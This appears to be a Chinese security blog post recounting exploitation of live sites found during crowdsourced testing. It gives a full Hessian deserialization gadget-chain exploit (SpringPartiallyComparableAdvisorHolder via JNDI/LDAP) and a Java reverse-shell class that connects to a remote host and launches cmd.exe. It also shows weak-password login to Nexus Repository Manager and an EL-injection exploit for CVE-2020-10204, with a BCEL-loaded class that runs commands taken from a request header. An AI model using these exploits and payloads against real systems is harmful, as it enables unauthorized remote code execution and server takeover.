title: 记一次实战的hessian反序列化
tags:
  - 反序列化
categories:
  - java
author: bmth
top_img: 'https://img-blog.csdnimg.cn/1e427f5f408d42d9a5e5ce54fc554a6e.png'
cover: 'https://img-blog.csdnimg.cn/1e427f5f408d42d9a5e5ce54fc554a6e.png'
date: 2023-03-07 18:12:00
---
![](https://img-blog.csdnimg.cn/1e427f5f408d42d9a5e5ce54fc554a6e.png)

哎，今年怕是连厂都进不了了，有没有人收留我啊，混口饭吃~

## hessian反序列化
在某公司实习的时候参与了众测项目，扫到了一个很奇怪的站，中间件为jetty
![](https://img-blog.csdnimg.cn/6ea915684dca46859464aa4955667eaf.png)

随便POST一个参数报错，发现是直接对POST参数进行反序列化，看到`HessianInput.readObject`就懂了，hessian可以打无依赖链，也可以打Rome、XBean、Resin、SpringPartiallyComparableAdvisorHolder等等，测试发现是windows操作系统

查找类的相关信息
![](https://img-blog.csdnimg.cn/366cbe37921d421c89d403215c7dbb2d.png)

发现跟 [https://gitee.com/xuxueli0323/xxl-job](https://gitee.com/xuxueli0323/xxl-job) 这个项目很像，以前是出过一次hessian反序列化漏洞的：[xxl-job api未授权Hessian2反序列化](https://xz.aliyun.com/t/8456)，使用的是SpringPartiallyComparableAdvisorHolder这条链

### SpringPartiallyComparableAdvisorHolder链
利用条件：存在 org.springframework:spring-aop 依赖

具体就不分析了，主要是`HotSwappableTargetSource.hashcode()`使得`p.hash == hash`、`XString.equals()`触发tostring()和反射的调用
poc：
```java
import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.aspectj.AspectInstanceFactory;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJPointcutAdvisor;
import org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import sun.reflect.ReflectionFactory;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;

public class Hessian_SpringPartiallyComparableAdvisorHolder {
    public static void main(String[] args) throws Exception {
        String jndiUrl = "ldap://127.0.0.1:6666/";
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiUrl);

        setFieldValue(bf, "logger", new NoOpLog());
        setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
        AspectInstanceFactory aif = createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
        setFieldValue(aif, "beanFactory", bf);
        setFieldValue(aif, "name", jndiUrl);

        AbstractAspectJAdvice advice = createWithoutConstructor(AspectJAroundAdvice.class);
        setFieldValue(advice, "aspectInstanceFactory", aif);

        AspectJPointcutAdvisor advisor = createWithoutConstructor(AspectJPointcutAdvisor.class);
        setFieldValue(advisor, "advice", advice);

        Class<?> pcahCl = Class.forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
        Object pcah = createWithoutConstructor(pcahCl);
        setFieldValue(pcah, "advisor", advisor);

        HotSwappableTargetSource v1 = new HotSwappableTargetSource(pcah);
        HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("xxx"));

        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);

        //序列化
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
        hessianOutput.getSerializerFactory().setAllowNonSerializable(true);
        hessianOutput.writeObject(s);
        hessianOutput.flush();
        byte[] bytes = byteArrayOutputStream.toByteArray();
        
        //反序列化
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        hessianInput.readObject();
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }
    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
}
```

调用栈如下：
```
lookup:417, InitialContext (javax.naming)
lambda$lookup$0:157, JndiTemplate (org.springframework.jndi)
doInContext:-1, 532854629 (org.springframework.jndi.JndiTemplate$$Lambda$1)
execute:92, JndiTemplate (org.springframework.jndi)
lookup:157, JndiTemplate (org.springframework.jndi)
lookup:179, JndiTemplate (org.springframework.jndi)
lookup:96, JndiLocatorSupport (org.springframework.jndi)
doGetSingleton:271, SimpleJndiBeanFactory (org.springframework.jndi.support)
doGetType:279, SimpleJndiBeanFactory (org.springframework.jndi.support)
getType:245, SimpleJndiBeanFactory (org.springframework.jndi.support)
getType:238, SimpleJndiBeanFactory (org.springframework.jndi.support)
getOrder:136, BeanFactoryAspectInstanceFactory (org.springframework.aop.aspectj.annotation)
getOrder:223, AbstractAspectJAdvice (org.springframework.aop.aspectj)
getOrder:66, AspectJPointcutAdvisor (org.springframework.aop.aspectj)
toString:147, AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder (org.springframework.aop.aspectj.autoproxy)
equals:392, XString (com.sun.org.apache.xpath.internal.objects)
equals:104, HotSwappableTargetSource (org.springframework.aop.target)
putVal:635, HashMap (java.util)
put:612, HashMap (java.util)
readMap:114, MapDeserializer (com.caucho.hessian.io)
readMap:538, SerializerFactory (com.caucho.hessian.io)
readObject:1160, HessianInput (com.caucho.hessian.io)
```


### getshell
使用JNDIExploit工具可以打Dnslog，但反弹shell是不支持windows的，内存马写不进去，无回显，最终考虑加载反弹shell的java字节码文件

java的反弹shell代码如下：
```java
public class ReverseShell {
    static {
        try{ 
            String host = "127.0.0.1";
            int port = 6666;
            String cmd = "cmd.exe";
            //String cmd = "/bin/sh";
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            java.net.Socket s = new java.net.Socket(host, port);
            java.io.InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            java.io.OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0) {
                    so.write(pi.read());
                }
                while (pe.available() > 0) {
                    so.write(pe.read());
                }
                while (si.available() > 0) {
                    po.write(si.read());
                }
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                }
            }
            p.destroy();
            s.close(); 
        } catch (Exception e){}
    }
}
```
然后拿marshalsec打
![](https://img-blog.csdnimg.cn/bea3a1bc5bb34e35b2bee2e335f9950b.png)

成功反弹shell，拿下
## Nexus Repository Manager EL表达式注入
近期又遇到一个站，是爬哥发给我的，说很好玩
![](https://img-blog.csdnimg.cn/04006f8b0f2f434c80709f6f2394b0bc.png)

发现是Nexus Repository Manager，版本为OSS 3.15.2-01，历史漏洞有CVE-2020-10199、CVE-2020-10204

影响版本：
Nexus Repository Manager OSS/Pro 3.x <= 3.21.1

但发现都是后台的洞，需要登录才能打，测试一下弱口令admin、admin123发现成功进入后台。。。
后台api接口：`/#admin/system/api`
![](https://img-blog.csdnimg.cn/924592e9f1894d07b8e0530d6fb69347.png)

管理员利用点在`/service/extdirect`这里，新建用户/更新用户可以执行EL表达式，首先将NX-ANTI-CSRF-TOKEN添加到Header头中
使用exp：
```json
{"action":"coreui_User","method":"create","data":[{"userId":"test","version":"","firstName":"test","lastName":"test","email":"test@test.com","status":"active","roles":["$\\A{6*6}"],"password":"test"}],"type":"rpc","tid":123}
```
![](https://img-blog.csdnimg.cn/db319c10f95d432c8b68cc61a38ca0d9.png)

成功解析，尝试命令执行，但是发现反射的时候执行invoke方法失败了
最终使用`com.sun.org.apache.bcel.internal.util.ClassLoader`来加载bcel编码过后的类
参考Hu3sky师傅的回显代码
```java
public class Echo_WebContext {
    static {
        try {
            Thread thread = Thread.currentThread();
            java.lang.reflect.Field threadLocals = Thread.class.getDeclaredField("threadLocals");
            threadLocals.setAccessible(true);
            Object threadLocalMap = threadLocals.get(thread);
            Class threadLocalMapClazz = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
            java.lang.reflect.Field tableField = threadLocalMapClazz.getDeclaredField("table");
            tableField.setAccessible(true);
            Object[] objects = (Object[]) tableField.get(threadLocalMap);
            Class entryClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
            java.lang.reflect.Field entryValueField = entryClass.getDeclaredField("value");
            entryValueField.setAccessible(true);
            for (Object object : objects) {
                if (object != null) {
                    Object valueObject = entryValueField.get(object);
                    if (valueObject != null) {
                        if (valueObject.getClass().getName().equals("com.softwarementors.extjs.djn.servlet.ssm.WebContext")) {
                            java.lang.reflect.Field response = valueObject.getClass().getDeclaredField("response");
                            response.setAccessible(true);
                            Object shiroServletResponse = response.get(valueObject);
                            Class<?> Wrapper = shiroServletResponse.getClass().getSuperclass().getSuperclass();
                            Object statusResponse = Wrapper.getMethod("getResponse").invoke(shiroServletResponse);
                            Object response1 = Wrapper.getMethod("getResponse").invoke(statusResponse);
                            java.io.PrintWriter writer = (java.io.PrintWriter) response1.getClass().getMethod("getWriter").invoke(response1);

                            java.lang.reflect.Field request = valueObject.getClass().getDeclaredField("request");
                            request.setAccessible(true);
                            Object shiroServletRequest = request.get(valueObject);
                            Class<?> Wrapper2 = shiroServletRequest.getClass().getSuperclass().getSuperclass();
                            Object statusResponse2 = Wrapper2.getMethod("getRequest").invoke(shiroServletRequest);
                            Object request1 = Wrapper2.getMethod("getRequest").invoke(statusResponse2);
                            Object request1Real = Wrapper2.getMethod("getRequest").invoke(request1);
                            String[] cmds = {"cmd.exe","/c" , (String)request1Real.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request1Real, new Object[]{"cmd"})};

                            String sb = "";
                            java.io.BufferedInputStream in = new java.io.BufferedInputStream(Runtime.getRuntime().exec(cmds).getInputStream());
                            java.io.BufferedReader inBr = new java.io.BufferedReader(new java.io.InputStreamReader(in));
                            String lineStr;
                            while ((lineStr = inBr.readLine()) != null)
                                sb += lineStr + "\n";
                            writer.write(sb);
                            writer.flush();
                            inBr.close();
                            in.close();
                        }
                    }
                }
            }

        } catch (Exception e) {
        }
    }
}
```
poc：
```
${''.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$' + code).newInstance()}
```
![](https://img-blog.csdnimg.cn/77c021c36e994a2a8cd9b521cd922247.png)

成功回显

参考：
[CVE-2020-10204 Nexus Repository Manager 3-远程执行代码漏洞分析](https://xz.aliyun.com/t/7559)
[Nexus Repository Manager(CVE-2020-10199/10204)漏洞分析及回显利用方法的简单讨论](https://www.cnblogs.com/magic-zero/p/12641068.html)
[CVE-2020-10204/CVE-2020-10199 Nexus Repository Manager3 分析&以及三个类的回显构造](https://hu3sky.github.io/2020/04/08/CVE-2020-10204_CVE-2020-10199:%20Nexus%20Repository%20Manager3%20%E5%88%86%E6%9E%90&%E4%BB%A5%E5%8F%8A%E4%B8%89%E4%B8%AA%E7%B1%BB%E7%9A%84%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/)
